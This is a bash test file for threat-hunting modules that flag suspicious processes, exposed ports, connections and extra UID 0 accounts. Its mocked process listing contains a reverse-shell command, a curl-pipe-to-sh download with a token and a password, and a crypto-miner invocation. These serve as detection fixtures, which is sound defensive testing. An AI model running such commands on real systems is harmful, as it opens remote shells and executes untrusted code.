#!/usr/bin/env bash
# shellcheck disable=SC2123  # tests narrow PATH on purpose to simulate missing tools
# Threat-hunting modules against mocked ps / ss / lsof / who / dscl, on both platforms.
. "$SHELL_TEST_ROOT/test/lib.sh"
t_setup

have_jq=0
command -v jq >/dev/null 2>&1 && have_jq=1
t_json() {
	if [ "$have_jq" = 1 ]; then
		if printf '%s' "$2" | jq -e . >/dev/null 2>&1; then t_ok; else t_bad "$1" "invalid JSON: $2"; fi
	else
		t_ok
	fi
}

# --- mocks -------------------------------------------------------------------
BIN="$HOME/bin"
mkdir -p "$BIN"
mock() { # mock <name>  (script body on stdin)
	{
		printf '#!/bin/sh\n'
		cat
	} >"$BIN/$1"
	chmod +x "$BIN/$1"
}
ORIG_PATH="$PATH"
export PATH="$BIN:$PATH"
SHELL_SECURITY_PROC_DIR="$HOME/no-proc" # never read the real /proc

cat >"$HOME/ps.out" <<'EOF'
    1     0 root       0.0  0.1 10-00:00:01 /sbin/init
  100     1 root       0.0  0.0       01:00 nginx: master process /usr/sbin/nginx
  200     1 root       0.0  0.0       05:00 /usr/sbin/sshd -D
  300     1 alice     95.5  1.0       01:00 /tmp/evil --run
  301     1 alice      0.1  0.0       01:00 /tmp/.hidden/agent
  302     1 alice      0.1  0.0       01:00 /tmp/we ird"dir\x/prog --flag
  303     1 alice      0.0  0.0       00:30 ghost
  304     1 alice      0.0  0.0       00:30 /usr/sbin/olddaemon
  400   399 www        0.0  0.0       01:00 bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
  500     1 bob        0.0  0.0       01:00 curl -s -H Authorization: Bearer tok123abc --password hunter2 http://x.test/i.sh | sh
  600   100 www        0.0  0.0       00:10 sh -c id
  700     1 bob        0.0  0.0       01:00 xmrig --url stratum+tcp://pool:3333
  800     1 bob        0.0  0.0       01:00 /usr/bin/grep xmrig file
  900     1 carol      0.1  0.0       01:00 /usr/local/bin/app --serve
  950     2 root       0.0  0.0       01:00 [kworker/0:1]
EOF
mock ps <<EOF
cat "$HOME/ps.out"
EOF

t_find() { # t_find <name> <json> <jq-filter-on-.findings[]>  -> expects at least one hit
	if [ "$have_jq" = 1 ]; then
		n="$(printf '%s' "$2" | jq "[.findings[] | select($3)] | length")"
		if [ "${n:-0}" -ge 1 ]; then t_ok; else t_bad "$1" "no finding matches: $3"; fi
	else
		t_ok
	fi
}
t_nofind() {
	if [ "$have_jq" = 1 ]; then
		n="$(printf '%s' "$2" | jq "[.findings[] | select($3)] | length")"
		if [ "${n:-0}" -eq 0 ]; then t_ok; else t_bad "$1" "unexpected finding matches: $3"; fi
	else
		t_ok
	fi
}

# --- hunt::processes ---------------------------------------------------------
json="$(shell::security::hunt::processes --format json)"
t_json "processes: valid JSON (special characters in command lines)" "$json"
t_find "processes: /tmp binary -> MEDIUM" "$json" '.severity=="MEDIUM" and (.resource|test("^pid 300 "))'
t_find "processes: hidden /tmp binary -> HIGH" "$json" '.severity=="HIGH" and (.resource|test("^pid 301 "))'
t_find "processes: path with spaces/quotes still detected" "$json" '(.resource|test("^pid 302 "))'
t_find "processes: reverse shell -> HIGH" "$json" '.severity=="HIGH" and (.description|test("reverse-shell"))'
t_find "processes: download-and-execute -> MEDIUM, low confidence" "$json" '.severity=="MEDIUM" and .confidence=="low" and (.description|test("download-exec"))'
t_find "processes: miner -> HIGH" "$json" '.severity=="HIGH" and (.description|test("miner"))'
t_find "processes: shell started by nginx -> MEDIUM" "$json" '.severity=="MEDIUM" and (.description|test("started by server program .nginx."))'
t_find "processes: high CPU is INFO only" "$json" '.severity=="INFO" and (.description|test("95.5% CPU"))'
t_find "processes: coverage INFO (process count)" "$json" '.description|test("^Inspected 15 processes")'
t_nofind "processes: grep naming a miner is not flagged" "$json" '.description|test("pid 800")'
t_nofind "processes: sshd under /usr is not flagged" "$json" '.resource|test("^pid 200")'
t_nofind "processes: kernel thread is skipped" "$json" '.resource|test("^pid 950")'
t_nofind "processes: own subtree skipped" "$json" '.resource|test("^pid 1 ")'
t_lacks "processes: bearer token never reported" "tok123abc" "$json"
t_lacks "processes: password never reported" "hunter2" "$json"
t_has "processes: password masked" "[REDACTED]" "$json"
t_has "processes: every finding explains benign causes (rationale present)" "also run from there" "$json"
t_eq "processes: findings are deduplicated across runs" "$(printf '%s' "$json" | jq '[.findings[].id] | unique | length' 2>/dev/null || echo x)" "$(printf '%s' "$json" | jq '.findings | length' 2>/dev/null || echo x)"

csv="$(shell::security::hunt::processes --format csv --min-severity HIGH)"
t_has "processes: csv min-severity keeps HIGH" '"HIGH"' "$csv"
t_lacks "processes: csv min-severity drops MEDIUM" '"MEDIUM"' "$csv"
t_has "processes: markdown report" "# Security findings" "$(shell::security::hunt::processes --format markdown)"
t_rc "processes: bad format -> 2" 2 shell::security::hunt::processes --format xml
t_rc "processes: unknown argument -> 2" 2 shell::security::hunt::processes --kill

# Linux /proc: real executable path, deleted binaries
mkdir -p "$HOME/proc/303" "$HOME/proc/304"
ln -s "/tmp/ghost (deleted)" "$HOME/proc/303/exe"
ln -s "/usr/sbin/olddaemon (deleted)" "$HOME/proc/304/exe"
SHELL_SECURITY_PROC_DIR="$HOME/proc"
json="$(shell::security::hunt::processes --format json)"
t_find "proc: deleted binary in /tmp -> HIGH" "$json" '.severity=="HIGH" and (.resource|test("^pid 303 ")) and (.description|test("temporary directory"))'
t_find "proc: deleted binary elsewhere -> LOW (package upgrade)" "$json" '.severity=="LOW" and (.resource|test("^pid 304 "))'
SHELL_SECURITY_PROC_DIR="$HOME/no-proc"

# ps missing: "not inspected", not "clean"
mkdir -p "$HOME/nobin"
for tool in awk sed tr grep cut sort date hostname uname mktemp rm cat head wc find ls sha256sum shasum openssl uniq paste getconf umask tail; do
	p="$(command -v "$tool" 2>/dev/null)"
	[ -n "$p" ] && [ -x "$p" ] && ln -sf "$p" "$HOME/nobin/$tool"
done
out="$(
	PATH="$HOME/nobin"
	shell::security::hunt::processes --format json 2>&1
)"
rc="$(
	PATH="$HOME/nobin"
	shell::security::hunt::processes >/dev/null 2>&1
	echo $?
)"
t_eq "processes: ps missing -> rc 3" "3" "$rc"
t_has "processes: ps missing is reported as Not inspected" "Not inspected: process listing" "$out"

# --- network: Linux (ss) -----------------------------------------------------
SHELL_OS_TYPE=linux
mock ss <<EOF
case "\$*" in
*established*) cat "$HOME/ss.conn" ;;
*) cat "$HOME/ss.listen" ;;
esac
EOF
cat >"$HOME/ss.listen" <<'EOF'
tcp   LISTEN 0 128 0.0.0.0:22      0.0.0.0:*  users:(("sshd",pid=10,fd=3))
tcp   LISTEN 0 128 0.0.0.0:6379    0.0.0.0:*  users:(("redis-server",pid=11,fd=6))
tcp   LISTEN 0 128 127.0.0.1:5432  0.0.0.0:*  users:(("postgres",pid=12,fd=5))
tcp   LISTEN 0 128 [::]:2375       [::]:*
udp   UNCONN 0 0   *:5353          *:*
EOF
cat >"$HOME/ss.conn" <<'EOF'
0 0 10.0.0.5:44444 203.0.113.9:4444 users:(("evil",pid=300,fd=4))
0 0 10.0.0.5:44445 203.0.113.9:443 users:(("curl",pid=200,fd=4))
0 0 127.0.0.1:1 127.0.0.1:2 users:(("x",pid=5,fd=1))
EOF
printf 'nameserver 10.1.1.1\nnameserver 10.1.1.2\n' >"$HOME/resolv.conf"
SHELL_SECURITY_RESOLV_CONF="$HOME/resolv.conf"
export https_proxy="http://user:pw@proxy.test:3128"

json="$(shell::security::hunt::network --format json)"
t_json "network/linux: valid JSON" "$json"
t_find "network: exposed redis -> MEDIUM" "$json" '.severity=="MEDIUM" and (.resource|test("tcp/6379"))'
t_find "network: exposed docker API on IPv6 -> HIGH" "$json" '.severity=="HIGH" and (.resource|test("tcp/2375"))'
t_nofind "network: ssh is not flagged" "$json" '.severity!="INFO" and (.resource|test("/22 "))'
t_nofind "network: loopback postgres is not flagged" "$json" '.resource|test("5432")'
t_find "network: owner unknown reported honestly" "$json" '.description|test("owning process of 2 exposed socket")'
t_find "network: DNS resolvers listed" "$json" '.description|test("10.1.1.1 10.1.1.2")'
t_find "network: proxy host shown without credentials" "$json" '.description|test("https_proxy=proxy.test:3128")'
t_lacks "network: proxy credentials never reported" "pw@" "$json"
t_lacks "network: proxy password never reported" "user:pw" "$json"
unset https_proxy
t_find "network: inferred service is hedged" "$json" '.rationale|test("inferred from the port only")'

json="$(shell::security::hunt::connections --format json)"
t_json "connections/linux: valid JSON" "$json"
t_find "connections: /tmp process with a remote peer -> HIGH (correlated)" "$json" '.severity=="HIGH" and (.description|test("temporary directory"))'
t_find "connections: remote port 4444 -> MEDIUM, low confidence" "$json" '.severity=="MEDIUM" and .confidence=="low"'
t_nofind "connections: ordinary https is not flagged" "$json" '.severity!="INFO" and (.resource|test(":443"))'
t_nofind "connections: loopback peer ignored" "$json" '.resource|test("127.0.0.1")'
tbl="$(shell::security::hunt::connections --list --format csv)"
t_has "connections --list csv header" '"protocol","local_address"' "$tbl"
t_has "connections --list row" '"203.0.113.9","4444","300","evil"' "$tbl"
t_json "connections --list json valid" "$(shell::security::hunt::connections --list --format json)"

# --- network: macOS (lsof) ---------------------------------------------------
SHELL_OS_TYPE=macos
mock lsof <<EOF
case "\$*" in
*ESTABLISHED*) cat "$HOME/lsof.conn" ;;
*TCP*) cat "$HOME/lsof.listen" ;;
*) printf 'p20\ncmDNSResponder\nf5\nPUDP\nn*:5353\nf6\nPUDP\nn*:*\n' ;;
esac
EOF
cat >"$HOME/lsof.listen" <<'EOF'
p30
credis-server
f6
PTCP
n*:6379
p31
cControlCenter
f7
PTCP
n127.0.0.1:7000
EOF
cat >"$HOME/lsof.conn" <<'EOF'
p300
cevil
f4
PTCP
n10.0.0.5:44444->203.0.113.9:4444
EOF
mock scutil <<'EOF'
printf 'resolver #1\n  nameserver[0] : 9.9.9.9\n'
EOF
json="$(shell::security::hunt::network --format json)"
t_json "network/macos: valid JSON" "$json"
t_find "network/macos: exposed redis -> MEDIUM with process name" "$json" '.severity=="MEDIUM" and (.description|test("redis-server"))'
t_nofind "network/macos: loopback listener not flagged" "$json" '.resource|test("7000")'
t_find "network/macos: bound UDP socket listed, unbound (*:*) skipped" "$json" '.description|test("udp/5353")'
t_nofind "network/macos: wildcard port * is not a listener" "$json" '.description|test("udp/\\*")'
t_find "network/macos: scutil resolver" "$json" '.description|test("9.9.9.9")'
t_find "connections/macos: remote port 4444" "$(shell::security::hunt::connections --format json)" '(.resource|test("4444"))'

# neither ss nor lsof: unavailable, rc 3
SHELL_OS_TYPE=linux
for tool in ss lsof; do rm -f "$BIN/$tool"; done
out="$(
	PATH="$HOME/nobin"
	shell::security::hunt::network --format json 2>&1
)"
rc="$(
	PATH="$HOME/nobin"
	shell::security::hunt::network >/dev/null 2>&1
	echo $?
)"
t_eq "network: no ss/lsof -> rc 3" "3" "$rc"
t_has "network: no ss/lsof reported as Not inspected" "Not inspected: listening sockets" "$out"
rc="$(
	PATH="$HOME/nobin"
	shell::security::hunt::connections --list >/dev/null 2>&1
	echo $?
)"
t_eq "connections --list: no tools -> rc 3" "3" "$rc"

# --- host users --------------------------------------------------------------
printf 'root:x:0:0::/root:/bin/sh\ntoor:x:0:0::/home/toor:/bin/sh\nalice:x:1000:1000::/home/alice:/bin/sh\n' >"$HOME/passwd"
printf 'sudo:x:27:alice,bob\nwheel:x:10:\nadmin:x:115:carol\n' >"$HOME/group"
SHELL_SECURITY_PASSWD_FILE="$HOME/passwd"
SHELL_SECURITY_GROUP_FILE="$HOME/group"
mock who <<'EOF'
printf 'alice  pts/0  2026-11-12 10:00 (10.0.0.9)\nalice  pts/1  2026-11-12 10:05\nbob  tty1  2026-11-12 09:00\n'
EOF
json="$(shell::security::host::users --format json)"
t_json "users/linux: valid JSON" "$json"
t_find "users: second UID 0 account -> HIGH" "$json" '.severity=="HIGH" and (.resource=="user toor")'
t_nofind "users: root itself is not flagged" "$json" '.resource=="user root"'
t_find "users: sudo members inventory is INFO" "$json" '.severity=="INFO" and (.description|test("sudo.*alice bob"))'
t_nofind "users: empty wheel group is skipped" "$json" '.description|test("wheel")'
t_find "users: sessions counted" "$json" '.description|test("alice\\(2\\), bob\\(1\\)")'

SHELL_SECURITY_PASSWD_FILE="$HOME/missing-passwd"
SHELL_SECURITY_GROUP_FILE="$HOME/missing-group"
json="$(shell::security::host::users --format json)"
t_find "users: unreadable passwd reported as Not inspected" "$json" '.description|test("Not inspected: UID 0 account check")'
t_find "users: unreadable groups reported as Not inspected" "$json" '.description|test("Not inspected: administrator group listing")'

SHELL_OS_TYPE=macos
mock dscl <<'EOF'
printf 'GroupMembership: root alice\n'
EOF
json="$(shell::security::host::users --format json)"
t_find "users/macos: admin group via dscl" "$json" '.description|test("admin.*root alice")'

# --- integration: a nested session collects instead of printing -------------
_shell::security::session::begin
owns="$_SHELL_SECURITY_OWNS"
out="$(shell::security::host::users --format json)"
t_eq "nested: inner function prints nothing when the session is owned by the caller" "" "$out"
_shell::security::finding::add host INFO "r" "outer finding" "src" "why" high "i" "r"
final="$(_shell::security::render::findings json INFO)"
t_has "nested: inner findings reached the outer store" "Members of administrative group" "$final"
t_has "nested: outer finding present" "outer finding" "$final"
rm -f "$_SHELL_SECURITY_STORE"
_SHELL_SECURITY_STORE=""
t_eq "nested: first begin owned the session" "1" "$owns"

PATH="$ORIG_PATH"
t_done
